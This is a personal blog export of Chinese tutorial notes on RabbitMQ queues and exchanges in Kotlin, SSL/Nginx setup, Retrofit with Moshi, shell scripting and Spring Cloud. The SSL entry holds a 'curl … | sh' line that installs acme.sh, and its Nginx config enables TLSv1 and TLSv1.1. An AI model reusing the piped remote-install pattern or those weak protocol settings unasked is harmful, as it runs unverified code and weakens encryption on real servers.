fun publicMessageAsync() &#123;    val channel = RabbitMqUtils.getChannel()    //队列名称    val QUEUE_NAME = UUID.randomUUID().toString()    channel.queueDeclare(QUEUE_NAME, false, false, false, null)    //开启发布确认    channel.confirmSelect()    /**     * 建立一个线程安全有序的一个哈希表，适用于高并发的情况下     * 1. 轻松的将序号与消息关联     * 2. 轻松批量删除消息条目     * 3. 支持多线程访问     */    val outstandingConfirms = ConcurrentSkipListMap&lt;Long, String&gt;()    //准备监听器    channel.addConfirmListener(&#123; deliveryTag, multiple -&gt;        //监听成功        println(&quot;确认的消息：$deliveryTag&quot;)        //删除掉已经确认的消息        //判断是否批量        if (multiple) &#123;            outstandingConfirms.headMap(deliveryTag).clear()        &#125; else &#123;            outstandingConfirms.remove(deliveryTag)        &#125;    &#125;, &#123; deliveryTag, multiple -&gt;        //监听失败        println(&quot;未确认的消息：$deliveryTag&quot;)        //如果有未确认的消息        println(outstandingConfirms[deliveryTag] + &quot;未被确认&quot;)    &#125;)    println(&quot;发送一千条数据耗时：&quot; + measureTimeMillis &#123;        for (i in 0..MESSAGE_COUNT) &#123;            val message = &quot;message $i&quot;            channel.basicPublish(&quot;&quot;, QUEUE_NAME, null, message.toByteArray())            //记录下要发送消息的总和            outstandingConfirms.put(channel.nextPublishSeqNo, message)        &#125;    &#125;)&#125;
&#x2F;&#x2F;1首先确定消息的总和&#x2F;&#x2F;2在确认消息中，把确认的消息删除掉&#x2F;&#x2F;3打印未确认的消息


不公平分发对于最开始发送消息时的轮询分发（也就是一人发一条信息，轮流接受）这就导致有消费者处理信息非常慢。影响整体效率。因此采用能者多劳
channel.basicQos(1)//默认就是0，也就是公平分发

预取值根据预取值分发消息，按照比例分配消息。
//分配几条就发几条channel.basicQos(//预取值)//这个玩意就类似于接受窗口//默认就是0，也就是公平分发

发布和订阅模式此前用到的都是一个生产者发布一个消息，并交由一个消费者消费。而交换机的一个作用就是实现消息的”发布和订阅”，即一消息多接受
交换机rabbitMQ的核心思想：生产者的消息从不会直接发送给队列。也就是队列的状态对于生产者是透明的。
exchanges类型
direct(直接)直接交换机的绑定是使用具体的routingKey来进行绑定，这样每个消息，只能发送到routingKey绑定的队列上。默认的无名交换机就是直接交换机。临时队列：创建出来的一个具有随机名字,没有持久化，当消费者断开连接后即自动删除的队列。
channel.queueDeclare().queue
直接获取临时队列

topit(主题)主题交换机的routingKey有限制要求：必须是一个单词列表，以点号分开（总共不能超过255个字节）*可以代替一个单词。#可以代替0个或多个单词简称：通配符匹配

headers(标题)

fanout(扇出)发布&#x2F;订阅模式接收者：
fun main(args: Array&lt;String&gt;) &#123;    val channel = RabbitMqUtils.getChannel()    //声明一个交换机    channel.exchangeDeclare(EXCHANGE_NAME, &quot;fanout&quot;)    //声明一个临时队列    val queueName = channel.queueDeclare().queue    //绑定交换机和队列    channel.queueBind(queueName, EXCHANGE_NAME, &quot;&quot;)    println(&quot;等待接受消息，把接收到的消息打印出来&quot;)    channel.basicConsume(queueName, true, &#123; consumerTag, message -&gt;        println(&quot;接收到:$&#123;String(message.body)&#125;&quot;)    &#125;, &#123; consumerTag -&gt; &#125;)&#125;
发布者：
fun main(args: Array&lt;String&gt;) &#123;    val channel = RabbitMqUtils.getChannel()    //交换机已经生成，不用再次创建//    channel.exchangeDeclare(EXCHANGE_NAME, &quot;fanout&quot;)    while (true) &#123;        var message = readLine()        channel.basicPublish(EXCHANGE_NAME, &quot;&quot;, null, message?.toByteArray())        println(&quot;发出消息：$message&quot;)    &#125;&#125;

死信队列无法被消费的消息。由于某些特定的原因导致queue中的某些消息无法被消费，这样的消息如果没有被后续处理，就变成了死信，从而就有了死信队列。应用场景：为了保证订单业务的数据不丢失。需要使用到RabbitMq的死信队列机制。来源：

消息TTL过期
队列达到最大长度
消息被拒，并且不放回队列中生产者代码：fun main(args: Array&lt;String&gt;) &#123;    val channel = RabbitMqUtils.getChannel()    //死信时间设置    val properties = AMQP.BasicProperties        .Builder()        .expiration(&quot;10000&quot;)        .build()    for (i in 0..10) &#123;        val message = &quot;info-$i&quot;        channel.basicPublish(NORMAL_EXCHANGE, &quot;zhangsan&quot;,properties ,message.toByteArray())    &#125;&#125;
消费者1代码：fun main(args: Array&lt;String&gt;) &#123;    val channel = RabbitMqUtils.getChannel()    //声明交换机    channel.exchangeDeclare(NORMAL_EXCHANGE, &quot;direct&quot;)    channel.exchangeDeclare(DEAD_EXCHANGE, &quot;direct&quot;)    //声明队列    val arguments = HashMap&lt;String, Any&gt;()    //过期时间设置    //arguments[&quot;x-message-ttl&quot;] = 10000    //可以通过生产者设置时间    //2. 设置队列最大长度，（超过长度的会变为死信内容）    arguments[&quot;x-max-length&quot;] = 6    //正常队列，设置死信后交换机    arguments[&quot;x-dead-letter-exchange&quot;] = DEAD_EXCHANGE    //设置死信routingKey    arguments[&quot;x-dead-letter-routing-key&quot;] = &quot;lisi&quot;    channel.queueDeclare(NORMAL_QUEUE, false, false, false, arguments)    //==============================================================================================//    channel.queueDeclare(DEAD_QUEUE, false, false, false, null)    channel.queueBind(NORMAL_QUEUE, NORMAL_EXCHANGE, &quot;zhangsan&quot;)    channel.queueBind(DEAD_QUEUE, DEAD_EXCHANGE, &quot;lisi&quot;)    channel.basicConsume(NORMAL_QUEUE, true, &#123; consumerTag, message -&gt;        println(String(message.body, charset(&quot;UTF-8&quot;)))    &#125;, &#123; consumerTag -&gt; &#125;)&#125;
消费者2代码：fun main(args: Array&lt;String&gt;) &#123;    val channel = RabbitMqUtils.getChannel()    channel.basicConsume(DEAD_QUEUE, true, &#123; consumerTag, message -&gt;        println(String(message.body, charset(&quot;UTF-8&quot;)))    &#125;, &#123; consumerTag -&gt; &#125;)&#125;

延迟队列就是死信队列中所谓的TTL（消息最大保存时间）延迟队列就是需要指定时间被处理的队列使用场景：如订单10分钟未支付则自动取消

springboot整合
依赖包导入：
dependencies &#123;    implementation(&quot;org.springframework.boot:spring-boot-starter-web&quot;)    implementation(&quot;com.fasterxml.jackson.module:jackson-module-kotlin&quot;)    implementation(&quot;org.jetbrains.kotlin:kotlin-reflect&quot;)    implementation (&quot;javax.servlet:javax.servlet-api:4.0.1&quot;)    implementation(&quot;org.springframework.boot:spring-boot-starter&quot;)//	rabbitMQ依赖    implementation(&quot;org.springframework.boot:spring-boot-starter-amqp&quot;)    implementation(&quot;com.squareup.moshi:moshi:1.13.0&quot;)    //注解    compileOnly(&quot;org.projectlombok:lombok&quot;)    annotationProcessor(&quot;org.projectlombok:lombok&quot;)    //swagger    implementation(&quot;io.springfox:springfox-swagger2:3.0.0&quot;)    implementation(&quot;io.springfox:springfox-swagger-ui:3.0.0&quot;)    //rabbitMQ测试依赖    testImplementation(&quot;org.springframework.boot:spring-boot-starter-test&quot;)    testImplementation(&quot;org.springframework.amqp:spring-rabbit-test&quot;)&#125;

配置项，配置交换机和队列以及他们的关系
@Configurationclass TtlQueueConfig &#123;    companion object&#123;        //普通交换机        val X_EXCHANGE = &quot;X&quot;        //死信交换机        val Y_DEAD_LETTER_EXCHANGE = &quot;Y&quot;        //普通队列        val QUEUE_A = &quot;QA&quot;        val QUEUE_B = &quot;QB&quot;        //死信队列        val QUEUE_DEAD_LETTER = &quot;QD&quot;    &#125;    //声明xExchange    @Bean(&quot;xExchange&quot;)    fun xExchange(): DirectExchange &#123;        return DirectExchange(X_EXCHANGE)    &#125;    //声明yExchange    @Bean(&quot;yExchange&quot;)    fun yExchange(): DirectExchange &#123;        return DirectExchange(Y_DEAD_LETTER_EXCHANGE)    &#125;    //声明普通队列TTL为10s    @Bean(&quot;queueA&quot;)    fun queueA(): Queue &#123;        val arguments = HashMap&lt;String, Any&gt;()        arguments[&quot;x-message-ttl&quot;] = 10000        arguments[&quot;x-dead-letter-exchange&quot;] = Y_DEAD_LETTER_EXCHANGE        arguments[&quot;x-dead-letter-routing-key&quot;] = &quot;YD&quot;        return QueueBuilder.durable(QUEUE_A).withArguments(arguments).build()    &#125;    //声明普通队列TTL为40s    @Bean(&quot;queueB&quot;)    fun queueB(): Queue &#123;        val arguments = HashMap&lt;String, Any&gt;()        arguments[&quot;x-message-ttl&quot;] = 40000        arguments[&quot;x-dead-letter-exchange&quot;] = Y_DEAD_LETTER_EXCHANGE        arguments[&quot;x-dead-letter-routing-key&quot;] = &quot;YD&quot;        return QueueBuilder.durable(QUEUE_B).withArguments(arguments).build()    &#125;    //死信队列    @Bean(&quot;queueD&quot;)    fun queueD(): Queue &#123;        return QueueBuilder.durable(QUEUE_DEAD_LETTER).build()    &#125;    //绑定    @Bean    fun queueABindingX(@Qualifier(&quot;queueA&quot;) queueA: Queue, @Qualifier(&quot;xExchange&quot;) exchange: DirectExchange): Binding &#123;        return BindingBuilder.bind(queueA).to(exchange).with(&quot;XA&quot;)    &#125;    @Bean    fun queueBBindingX(@Qualifier(&quot;queueB&quot;) queueB: Queue, @Qualifier(&quot;xExchange&quot;) exchange: DirectExchange): Binding &#123;        return BindingBuilder.bind(queueB).to(exchange).with(&quot;XB&quot;)    &#125;    @Bean    fun queueDBindingY(@Qualifier(&quot;queueD&quot;) queueD: Queue, @Qualifier(&quot;yExchange&quot;) exchange: DirectExchange): Binding &#123;        return BindingBuilder.bind(queueD).to(exchange).with(&quot;YD&quot;)    &#125;&#125;

设置生产者
@Slf4j@RestController@RequestMapping(&quot;/ttl&quot;)class SendMsgController &#123;    private val log = LoggerFactory.getLogger(this.javaClass)    @Autowired    private lateinit var rabbitTemplate: RabbitTemplate    //开始发消息    @GetMapping(&quot;/send/&#123;message&#125;&quot;)    fun sendMsg(@PathVariable message: String) &#123;        log.info(&quot;当前时间：$&#123;Date().toString()&#125;,发送一条消息给两个TTL队列：$message&quot;)        rabbitTemplate.convertAndSend(&quot;X&quot;, &quot;XA&quot;, &quot;消息消过期时间为10s：$message&quot;)        rabbitTemplate.convertAndSend(&quot;X&quot;, &quot;XB&quot;, &quot;消息消过期时间为40s：$message&quot;)    &#125;&#125;

设置消费者
class DeadLetterQueueConsumer &#123;    private val log = LoggerFactory.getLogger(this.javaClass)    //接受消息    @RabbitListener(queues = [&quot;QD&quot;])    fun reveiceD(message:Message,channel:Channel)&#123;        var msg = String(message.body)        log.info(&quot;当前时间：$&#123;Date().toString()&#125;,收到死信队列的消息：$msg&quot;)    &#125;&#125;

通过生产者设置过期时间


//发消息和延迟时间   @GetMapping(&quot;/send/&#123;message&#125;/&#123;ttl&#125;&quot;)   fun sendMsg(@PathVariable message: String, @PathVariable ttl: Int) &#123;       log.info(&quot;当前时间：$&#123;Date().toString()&#125;,他的过期时间为：$ttl ms ,发送一条消息给两个TTL队列：$message&quot;)       rabbitTemplate.convertAndSend(&quot;X&quot;, &quot;XC&quot;, &quot;消息过期时间为$ttl ms的消息：$message&quot;) &#123; msg -&gt;           //设置过期时间           msg.messageProperties.expiration = ttl.toString()           msg       &#125;   &#125;


出现问题（队列先进先出）这个是基于死信队列才会产生的问题。因此采用基于插件的方式去解决

基于插件解决延迟队列
安装延时队列插件可去官网下载 rabbitmq_delayed_message_exchange 插件，放置到 RabbitMQ 的插件目录。

进入 RabbitMQ 的安装目录下的 plgins 目录，执行下面命令让该插件生效，然后重启 RabbitMQ
[root@VM-0-6-centos software]# lserlang-21.3.8.21-1.el7.x86_64.rpm  rabbitmq_delayed_message_exchange-3.8.0.ez  rabbitmq-server-3.8.8-1.el7.noarch.rpm#移动cp rabbitmq_delayed_message_exchange-3.8.0.ez /usr/lib/rabbitmq/lib/rabbitmq_server-3.8.8/plugins#安装rabbitmq-plugins enable rabbitmq_delayed_message_exchange#重启服务systemctl restart rabbitmq-server
在这里新增了一个队列delayed.queue,一个自定义交换机 delayed.exchange，绑定关系如下:

配置文件类代码：

在我们自定义的交换机中，这是一种新的交换类型，该类型消息支持延迟投递机制消息传递后并不会立即投递到目标队列中，而是存储在 mnesia(一个分布式数据系统)表中，当达到投递时间时，才投递到目标队列中。
@Configurationpublic class DelayedQueueConfig &#123;    public static final String DELAYED_QUEUE_NAME = &quot;delayed.queue&quot;;    public static final String DELAYED_EXCHANGE_NAME = &quot;delayed.exchange&quot;;    public static final String DELAYED_ROUTING_KEY = &quot;delayed.routingkey&quot;;    @Bean    public Queue delayedQueue() &#123;        return new Queue(DELAYED_QUEUE_NAME);    &#125;    //自定义交换机 我们在这里定义的是一个延迟交换机    @Bean    public CustomExchange delayedExchange() &#123;        Map&lt;String, Object&gt; args = new HashMap&lt;&gt;();        //自定义交换机的类型        args.put(&quot;x-delayed-type&quot;, &quot;direct&quot;);        return new CustomExchange(DELAYED_EXCHANGE_NAME, &quot;x-delayed-message&quot;, true, false, args);    &#125;    @Bean    public Binding bindingDelayedQueue(@Qualifier(&quot;delayedQueue&quot;) Queue queue,                                       @Qualifier(&quot;delayedExchange&quot;) CustomExchange delayedExchange) &#123;        return BindingBuilder.bind(queue).to(delayedExchange).with(DELAYED_ROUTING_KEY).noargs();    &#125;&#125;

生产者代码@GetMapping(&quot;sendDelayMsg/&#123;message&#125;/&#123;delayTime&#125;&quot;)public void sendMsg(@PathVariable String message, @PathVariable Integer delayTime) &#123;    rabbitTemplate.convertAndSend(DELAYED_EXCHANGE_NAME, DELAYED_ROUTING_KEY, message,            correlationData -&gt; &#123;                correlationData.getMessageProperties().setDelay(delayTime);                return correlationData;            &#125;);    log.info(&quot; 当 前 时 间 ： &#123;&#125;, 发 送 一 条 延 迟 &#123;&#125; 毫秒的信息给队列 delayed.queue:&#123;&#125;&quot;, new Date(), delayTime, message);&#125;

总结延时队列在需要延时处理的场景下非常有用，使用 RabbitMQ 来实现延时队列可以很好的利用 RabbitMQ 的特性，如：消息可靠发送、消息可靠投递、死信队列来保障消息至少被消费一次以及未被正确处理的消息不会被丢弃。另外，通过 RabbitMQ 集群的特性，可以很好的解决单点故障问题，不会因为 单个节点挂掉导致延时队列不可用或者消息丢失。
当然，延时队列还有很多其它选择，比如利用 Java 的 DelayQueue，利用 Redis 的 zset，利用 Quartz 或者利用 kafka 的时间轮，这些方式各有特点,看需要适用的场景
发布确认-springboot集成在生产环境中，出现特殊情况导致rabbitMQ重启。如何去手动回复和处理。
发布确认，（交换机）
配置确认发布在application.yml中配置：
publisher-confirm-type: correlated
他有三个选项：1. NONE，默认，不开启发布确认。2. CORRELATED，发布消息成功后触发回调方法。3. SIMPLE，他的第一个效果和CORRELATED一样，第二个效果是如果他接受到waitForConfirmsOrDie的返回值为false时，会直接关闭channel信道。

生产者代码：
//发消息    @GetMapping(&quot;/send/&#123;msg&#125;&quot;)    fun send(@PathVariable msg: String) &#123;        rabbitTemplate.convertAndSend(&quot;confirm_exchange&quot;, &quot;key1&quot;, msg, CorrelationData(&quot;1&quot;))        log.info(&quot;发送消息：$msg&quot;)    &#125;

他需要配置回调接口
@Componentclass MyCallBack : RabbitTemplate.ConfirmCallback &#123;    @Autowired    private lateinit var rabbitTemplate: RabbitTemplate    private val log = LoggerFactory.getLogger(javaClass)    @PostConstruct    fun init()&#123;        if (::rabbitTemplate.isInitialized) &#123;            rabbitTemplate.setConfirmCallback(this)        &#125; else &#123;            log.info(&quot;rabbitTemplate 没有初始化&quot;)        &#125;    &#125;    //交换机回调方法    override fun confirm(correlationData: CorrelationData?, ack: Boolean, cause: String?) &#123;        val id = correlationData?.id        if (ack) &#123;            log.info(&quot;交换机已经收到了ID为：$id 的消息&quot;)        &#125; else &#123;            log.info(&quot;交换机没有收到ID为：$id 的消息,原因是：$cause&quot;)        &#125;    &#125;&#125;


消费者代码：@Componentclass ConfirmConsumer &#123;    private val log = LoggerFactory.getLogger(javaClass)    @RabbitListener(queues = [&quot;confirm_queue&quot;])    fun receive(msg: Message) &#123;        log.info(&quot;接收到的消息：&#123;&#125;&quot;, String(msg.body))    &#125;&#125;

回退消息通过设置mandatory参数可以将消息传递过程中不可达目的的消息返还给生产者配置项：publisher-returns: true然后再配置回退消息的回调函数，然后执行即可：
@Componentclass MyCallBack : RabbitTemplate.ConfirmCallback,RabbitTemplate.ReturnsCallback &#123;  ...    override fun returnedMessage(returned: ReturnedMessage) &#123;    &#125;&#125;

备份交换机优点：可以备份消息和报警他的关键点是他的正常交换机参数需要设置一个当正常交换机出现问题时，他会进入备份交换机。（与死信交换机类似）。只是死信交换机是消息无法正确得到解决会进入死信交换机。而消息如果无法正常进入交换机时，会进入备份交换机
如果消息回退和备份交换机同时开启，谁会优先执行：经检测：备份交换机优先级更高
幂等性应用场景：消息重复消费。消费者再消费MQ时，已经处理完了该信息，但是再返回ack确认时，网络中断。故MQ会重新发送这条消息给该消费者或其他消费者。这就会导致重复消费。解决办法：使用全局ID表示。可以用时间戳或者UUID的一个全局唯一ID。两种操作a. 唯一ID+指纹码机制b. 利用redis的原子性去实现redis原生具有setnx。天生具有幂等性判断。
优先级队列使用场景：订单催送。一般情况下，队列中的消息是先进先出的顺序。但是使用了优先级队列，那么优先级高的可以先被消费官方允许最大优先级的数量为(0-255)他的关键实现就是对队列设置优先级和消息设置优先级。
惰性队列惰性队列的消息是保存在磁盘中的。他的消费速度会比较慢常用于消费者宕机或者下线维护时。这样子就不会消息堆积导致消息丢失了。
RabbitMQ集群
]]></content>
      <categories>
        <category>RabbitMQ</category>
      </categories>
  </entry>
  <entry>
    <title>SSL证书配置、自动部署和Nginx集成</title>
    <url>/posts/f1d3065d/</url>
    <content><![CDATA[关于如何配置ssl证书和自动装配，并且部署到nginx的服务器上。

首先在freessl.cn部署一个ssl证书，可以是泛域名的。他只有一个月。搭配上acme就可以永久部署了。
具体步骤如下先获得ssl泛域名证书。
然后安装acme完成自动化部署。

安装使用下面这个命令：
curl https://get.acme.sh | sh -s email=my@example.com

可以根据上面这个模板进行修改。最后就算部署完成，可以正常浏览你的网站了.安装完成后，就根据freessl给你的命令，直接复制到你的服务器执行，然后就在服务器上安装好自动更新的证书了。但是此时的证书任然没有部署到域名上，仍然需要操作

部署好后，请记住你的证书安装的地址，这个之后部署到nginx上需要使用。
nginx部署ssl证书最好的做法不是直接修改nginx.conf 文件，而是在conf.d 文件夹下添加与你相关的服务的信息。如果没有conf.d文件夹可以自己创建。然后再nginx.conf里引用你创建的文件即可。下面是一个示例：
 server &#123;        listen 80;        server_name memos.zfxt.top;        add_header Strict-Transport-Security max-age=15768000;        return 301 https://$server_name$request_uri;    &#125;server &#123;        listen 443 ssl;        server_name memos.zfxt.top;        # 下面ssl开头的是HTTPS相关的设置        ssl on;        ssl_certificate           /root/.acme.sh/*.zfxt.top_ecc/fullchain.cer;        ssl_certificate_key     /root/.acme.sh/*.zfxt.top_ecc/*.zfxt.top.key;        ssl_session_timeout     3600m;#session有效期，根据需要适当延长        ssl_session_cache       shared:SSL:10m;        # 使用的加解密方式        ssl_ciphers             ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;        # 支持的协议类型        ssl_protocols             TLSv1 TLSv1.1 TLSv1.2;        # 优先使用服务端的加解密方式        ssl_prefer_server_ciphers on;             location / &#123;            # 单个服务            proxy_pass http://127.0.0.1:5230/;            # 负载均衡            # proxy_pass http://yourServers/;                        proxy_redirect off;                       proxy_set_header        X-Real-IP           $remote_addr;            proxy_set_header        X-Forwarded-For     $proxy_add_x_forwarded_for;            proxy_set_header        Host                $http_host;            proxy_set_header        X-NginX-Proxy       true;        &#125;    &#125;
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>nginx</tag>
        <tag>ssl证书</tag>
      </tags>
  </entry>
  <entry>
    <title>Retrofit和moshi的搭配使用模板</title>
    <url>/posts/7429e79a/</url>
    <content><![CDATA[moshi,新一代Json解析库基本用法
fun main() = runBlocking &#123;    val moshi = Moshi.Builder()        .addLast(KotlinJsonAdapterFactory())        .build()    val json = &quot;&quot;&quot;&#123;&quot;_name&quot;:&quot;xxx&quot;,&quot;age&quot;:12&#125;&quot;&quot;&quot;    val person = moshi.adapter(Peoson::class.java).fromJson(json)    println(person)&#125;@JsonClass(generateAdapter = true)//为了贴合condegen使用，他可以提高moshi在kotlin中的运行时速率data class Peoson(    @Json(name = &quot;_name&quot;)    val name:String,    val age:Int)

##标准使用模板retrofit
import com.squareup.moshi.Moshiimport com.squareup.moshi.kotlin.reflect.KotlinJsonAdapterFactoryimport retrofit2.Retrofitimport retrofit2.converter.moshi.MoshiConverterFactoryobject Network &#123;    private val baseUrl = &quot;https://zfxt.top/&quot;    private val retrofit = Retrofit.Builder()        .baseUrl(baseUrl)        .addConverterFactory(            MoshiConverterFactory.create(                Moshi.Builder()                    .add(KotlinJsonAdapterFactory())                    .build()            )        ).build()//用来构建每个具体的服务类    fun &lt;T&gt;createService(clazz: Class&lt;T&gt;): T&#123;        return retrofit.create(clazz)    &#125;&#125;
首先，配置一个单例类，用来配置retrofit。然后用interface接口来定义每个接口服务如
import retrofit2.http.GETinterface PersonService &#123;    @GET(&quot;person&quot;)    suspend fun person():Peoson    companion object&#123;	//生成实例对象        fun instance():PersonService&#123;            return Network.createService(PersonService::class.java)        &#125;    &#125;&#125;
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>moshi</tag>
        <tag>retrofit</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell脚本中的表达式和流程控制</title>
    <url>/posts/32062179/</url>
    <content><![CDATA[表达式运算符$(())或者$[]都可以用来在内部写表达式，运算操作符。
判断语句[ condition ]（condition前后要有空格）非空返回true判断字符串相等，用&#x3D;。
if [ &quot;ok&quot; = &quot;ok&quot; ]then echo &#x27;equal&quot;elif [ 条件判断式 ]thenfi## case语句case $变量 in&quot;变量1&quot;)执行命令;;&quot;变量2&quot;)执行命令2;;esac
for循环1.for 变量 in 值1 值2 值3.。。do程序/代码done2.for(( 初始值；循环控制条件；变量变化))do程序/代码done
while循环while [ 条件判断式 ]do 程序done
读取控制台输入read (选项)(参数)-p:指定读值时的提示符。-t:指定读取值时等待的秒数。如果一定时间内没输入，就退出。
read -p &quot;请输入一个数Num1=&quot; NUM1read -p &quot;请在10s内请输入一个数Num1=&quot; NUM1 -t 10
系统命令basename可以获取文件的文件名dirname，可以获取文件的路径
自定义函数他的参数可以动态的获取
function getSum()&#123;    SUM=$[ $n1+$n2 ]echo &quot;和是 $SUM&quot;&#125;n1 = 10n2 = 20getSum $n1 $n2
类似js
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell脚本：命令解释和脚本编写</title>
    <url>/posts/e1f35603/</url>
    <content><![CDATA[shell是一个命令解释器，用来向内核发送请求。通过写shell脚本，通过shell执行。（bashshell）
脚本格式#!/bin/bash开头脚本要有执行权限。或者使用sh来执行脚本，他可以不需要执行权限。sh hello.sh
定义变量A&#x3D;100调用该变量时需要使用$
A=100echo A=$Aecho &quot;A=$A&quot;#这两个的输出结果是一样的。都是A=100#只有$A才会被解析#撤销变量unset A#声明静态变量#只会定义一次，不会被反复初始化。而且不能被unsetreadonly B=2#在shell中，等号两侧不允许又空格## 将命令的返回值返回出去A=`data` or A=$(data)#其中data是命令。
定义全局变量export。可以在&#x2F;etc&#x2F;profile中写入。然后通过source命令刷新。也可以部分权限。写入bashrc中也可以所谓全局变量，就是指变量在当前的整个 Shell 进程中都有效。每个 Shell 进程都有自己的作用域，彼此之间互不影响。在 Shell 中定义的变量，默认就是全局变量。
需要强调的是，全局变量的作用范围是当前的 Shell 进程，而不是当前的 Shell 脚本文件，它们是不同的概念。打开一个 Shell 窗口就创建了一个 Shell 进程，打开多个 Shell 窗口就创建了多个 Shell 进程，每个 Shell 进程都是独立的，拥有不同的进程 ID。在一个 Shell 进程中可以使用 source 命令执行多个 Shell 脚本文件，此时全局变量在这些脚本文件中都有效。
注释#单行注释使用`#`多行注释使用:&lt;&lt;!其中是被注释的内容。!
位置参数变量执行shell脚本时，直接后置参数传入。比如：./myshell.sh 100 200这就是一个执行shell的命令行。

$n表示第几个参数，10以上的参数需要用${10}之类
$*表示所有的参数
$@表示所有的参数。
$#表示参数的个数


## 预定义变量
$$当前进程的PID
$!后台运行最后一个进程的pid

]]></content>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(10)</title>
    <url>/posts/bb15ea4/</url>
    <content><![CDATA[分布式请求链路监控Sleuth在微服务框架中，一个由客户端发起的请求在后端系统中会经过多个不同的的服务节点调用来协同产生最后的请求结果，每一个前段请求都会形成一条复杂的分布式服务调用链路，链路中的任何一环出现高延时或错误都会引起整个请求最后的失败。
zipkin dashboard监控
下载zipkin的jar包，然后直接运行jar包出现以上界面就算zipkin部署完成然后访问localhost:9411/zipkin/即可访问
依次启用8001，80微服务当然这些服务理应完成一些配置POM.XML:&lt;!--        包含了zipkin+sleuth--&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-zipkin&lt;/artifactId&gt;        &lt;/dependency&gt;
applicaiton.yml:spring:  application:    name: cloud-payment-service  zipkin:    base-url: http://localhost:9411    sleuth:      sampler:        # 采样率介于0与1之间，1表示全部采集        probalility: 1


]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud(11)</title>
    <url>/posts/12aa6fe5/</url>
    <content><![CDATA[Nacos服务注册和配置中心nacos安装在官网下载压缩包https://nacos.io/zh-cn/docs/quick-start.html然后执行对应的命令。启动完成后，访问localhost:8848/nacos即可访问该界面。账号密码都是nacos
服务注册中心
生产者：POM：
    &lt;dependencies&gt;&lt;!--        alibabanacos--&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;top.zfxt.springcloud&lt;/groupId&gt;            &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt;            &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;            &lt;artifactId&gt;kotlin-reflect&lt;/artifactId&gt;            &lt;version&gt;1.9.0&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;
YML:
server:  port: 9001spring:  application:    name: nacos-provider  cloud:    nacos:      discovery:        server-addr: localhost:8848management:  endpoints:    web:      exposure:        include: &quot;*&quot;
主启动类：
@SpringBootApplication@EnableDiscoveryClientopen class NacosPayment9001 &#123;&#125;fun main(args: Array&lt;String&gt;) &#123;    runApplication&lt;NacosPayment9001&gt;(*args)&#125;
复制微服务：

消费者：YML:


server:  port: 83spring:  application:    name: nacos-order-consumer  cloud:    nacos:      discovery:        server-addr: localhost:8848# 消费者将要去访问的微服务名称（注册成功进nacos的微服务提供者）service-url:  nacos-user-service: http://nacos-payment-provider  
然后他需要配置restTemplate，在业务类中也可以使用到yml中配置的servcie-url业务类：
@RestControllerclass OrderNacosController &#123;    @Resource    private lateinit var restTemplate: RestTemplate    @Value(&quot;\$&#123;service-url.nacos-user-service&#125;&quot;)    private lateinit var serverURL: String    @GetMapping(&quot;/consumer/payment/nacos/&#123;id&#125;&quot;)    fun paymentInfo(@PathVariable(&quot;id&quot;) id: Long): String &#123;        return restTemplate.getForObject(serverURL+&quot;/payment/nacos/$id&quot; ,String::class)    &#125;&#125;
CP+AP的选择和使用
服务配置中心
基础配置信息POM：&lt;!--nacos-config--&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!--nacos-discovery--&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;        &lt;/dependency&gt;
YML:


bootstrap.yml
# nacos配置server:  port: 3377spring:  application:    name: nacos-config-client  cloud:    nacos:      discovery:        server-addr: localhost:8848 #Nacos作为服务注册中心      config:        server-addr: localhost:8848 #Nacos作为服务配置中心        file-extension: yaml # 指定需要yaml格式的配置

application.yml


spring:  profiles:    active: dev # 表示开发环境
主启动类：
@SpringBootApplication@EnableDiscoveryClientopen class NacosClient3377 &#123;&#125;fun main(args: Array&lt;String&gt;) &#123;    runApplication&lt;NacosClient3377&gt;(*args)&#125;

业务类：
@RestController@RefreshScope //支持Nacos的动态刷新功能open class ConfigInfoController &#123;    @Value(&quot;\$&#123;config.info&#125;&quot;)    private lateinit var configInfo: String    @GetMapping(&quot;/configInfo&quot;)    fun getConfigInfo(): String &#123;        return configInfo    &#125;&#125;

匹配规则：
然后在nacos服务中添加一个配置项

这里说明一个错误详见(https://zfxt.top/index.php/archives/411/)在这里使用时，很明显，RefreshScoping他会动态生成。也就是会额外的创建，因此我们需要给与他open也就是允许被修改的权限，同时，我们需要保证他的安全性，在这里private是无法使用的，private和open不能同时使用。他们定义相冲突。因此我选择使用了protected

在使用NACOS的话，你修改了配置，他可以自动更新并加载。也就是代替了原本的POST更新请求和bus总线
Nacos的分类管理

DataID方案就是修改spring.profiles.active 常用的有dev，test等
Group方案在Nacos的图形化界面为配置文件添加Group，然后在bootstrap.yml下的config下添加一个group属性即可
NameSpace方案在Nacos中建立新的命名空间。他会生成一些对应的namespaceID。然后再bootstrap.yml中可以添加如下：

Nacos集群和持久化配置https://nacos.io/zh-cn/docs/cluster-mode-quick-start.html
